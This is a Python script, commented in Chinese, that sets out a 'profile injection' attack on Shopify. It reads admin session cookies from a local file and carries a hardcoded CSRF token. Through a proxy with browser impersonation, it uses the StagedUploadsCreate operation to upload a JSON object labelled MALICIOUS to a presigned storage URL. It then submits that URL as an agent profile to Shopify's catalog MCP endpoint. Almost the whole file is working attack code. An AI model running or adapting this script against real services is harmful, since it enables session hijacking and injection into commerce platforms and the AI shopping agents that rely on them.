# -*- coding: utf-8 -*-
"""Profile 注入最终方案:StagedUploadsCreate -> 预签名 URL 上传(带 Cache-Control 头) -> MCP profile
关键:对象存储 PUT 时的 Content-Type/Cache-Control 会作为元数据,GET 时回显
"""
import json, time, urllib.parse
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}
SHOP = "jqpkdm-kb"
HASH = "b956e5aac09a77df4612cfeca05b03f9d7d4a5378013c2ef526a671e1e9a781d"
OP_URL = f"https://admin.shopify.com/api/operations/{HASH}/StagedUploadsCreate/shopify/{SHOP}"

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

H = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
    "Origin": "https://admin.shopify.com",
    "Referer": f"https://admin.shopify.com/store/{SHOP}/settings/files",
    "Content-Type": "application/json",
}

MALICIOUS = {
    "ucp": {
        "version": "2026-04-08",
        "services": {
            "dev.ucp.shopping": [{
                "version": "2026-04-08",
                "spec": "https://ucp.dev/2026-04-08/specification/overview",
                "transport": "mcp",
                "schema": "https://ucp.dev/2026-04-08/services/shopping/mcp.openrpc.json"
            }]
        },
        "capabilities": {
            "dev.ucp.shopping.checkout": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/checkout", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/checkout.json"}],
            "dev.ucp.shopping.order": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/order", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/order.json"}],
            "dev.ucp.shopping.buyer_consent": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/buyer-consent", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/buyer_consent.json"}],
            "dev.ucp.shopping.cart": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/cart", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/cart.json"}],
            "dev.ucp.shopping.discount": [{"version": "2026-04-08", "spec": "https://ucp.dev/2026-04-08/specification/discount", "schema": "https://ucp.dev/2026-04-08/schemas/shopping/discount.json"}]
        }
    }
}

def stage_upload():
    payload = json.dumps(MALICIOUS)
    body = {"variables": {"input": [{
        "filename": "profile.json",
        "mimeType": "application/json",
        "fileSize": str(len(payload)),
        "resource": "FILE",
    }]}}
    r = requests.post(OP_URL, headers=H, cookies=load_cookies(), json=body, proxies=PROXY, impersonate="chrome", timeout=40)
    print(f"[stage] HTTP {r.status_code} | {r.text[:600]}")
    try:
        j = r.json()
        st = j.get("data", {}).get("stagedUploadsCreate", {}).get("stagedTargets", [])
        if st:
            return st[0]
    except Exception as e:
        print(f"[stage] parse err {e}")
    return None

def upload_to_target(target):
    url = target["url"]
    params = {p["name"]: p["value"] for p in target.get("parameters", [])}
    # 预签名 URL 参数通常是查询参数,拼到 URL
    if params:
        qs = urllib.parse.urlencode(params)
        url = url + ("&" if "?" in url else "?") + qs
    print(f"[PUT] {url[:150]}...")
    hh = {
        "Content-Type": "application/json",
        "Cache-Control": "public, max-age=3600",
        "x-ms-blob-type": "BlockBlob",  # 若为 Azure 存储
        "User-Agent": "Mozilla/5.0",
    }
    r = requests.put(url, headers=hh, data=json.dumps(MALICIOUS), proxies=PROXY, impersonate="chrome", timeout=40)
    print(f"[PUT] HTTP {r.status_code} | {r.text[:200]}")
    return url

def verify_get(url):
    r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, proxies=PROXY, impersonate="chrome", timeout=30)
    print(f"[GET] HTTP {r.status_code} ct={r.headers.get('Content-Type')} cc={r.headers.get('Cache-Control')}")
    print(f"[GET] body: {r.text[:120]}")
    return r.status_code == 200

def mcp_call(profile_url):
    body = {"jsonrpc": "2.0", "method": "tools/call", "id": 1,
            "params": {"name": "search_catalog", "arguments": {"meta": {"ucp-agent": {"profile": profile_url}}, "query": "shoes"}}}
    r = requests.post("https://catalog.shopify.com/api/ucp/mcp", json=body,
                      headers={"User-Agent": H["User-Agent"], "Content-Type": "application/json", "Accept": "application/json"},
                      proxies=PROXY, impersonate="chrome", timeout=30)
    print(f"[MCP] {r.text[:400]}")

if __name__ == "__main__":
    print("== 1. StagedUploadsCreate ==")
    target = stage_upload()
    if not target:
        print("!! staged target 获取失败")
        raise SystemExit
    print(f"    url={target['url'][:120]}...")
    print(f"    resourceUrl={target.get('resourceUrl', '')[:120]}")
    time.sleep(1)
    print("\n== 2. PUT 恶意 JSON(带 Cache-Control) ==")
    url = upload_to_target(target)
    time.sleep(1)
    print("\n== 3. GET 验证响应头 ==")
    verify_get(url)
    time.sleep(1)
    print("\n== 4. MCP profile 注入 ==")
    mcp_call(url)
